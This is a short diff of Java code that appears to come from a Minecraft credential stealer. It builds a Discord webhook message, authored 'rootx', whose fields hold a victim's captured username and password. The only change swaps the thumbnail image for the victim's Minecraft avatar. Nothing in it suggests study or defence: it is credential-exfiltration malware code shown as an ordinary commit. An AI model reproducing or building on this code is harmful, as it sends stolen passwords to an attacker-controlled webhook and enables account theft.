@@ -19,7 +19,7 @@ public class Main {
         webhook.addEmbed((new WebhookUtil.EmbedObject())
                 .setAuthor("rootx", "", "")
                 .setColor(new Color(new Random().nextInt(0xFFFFFF)))
-                .setThumbnail("https://cdn.discordapp.com/attachments/758582848604733442/766991691206623242/1f6a6f4454d463ea00f601bc7b2e9f7a.png")
+                .setThumbnail("https://minotar.net/avatar/" + username)
                 .addField("Username", username, true)
                 .addField("Password", password, true)
         );
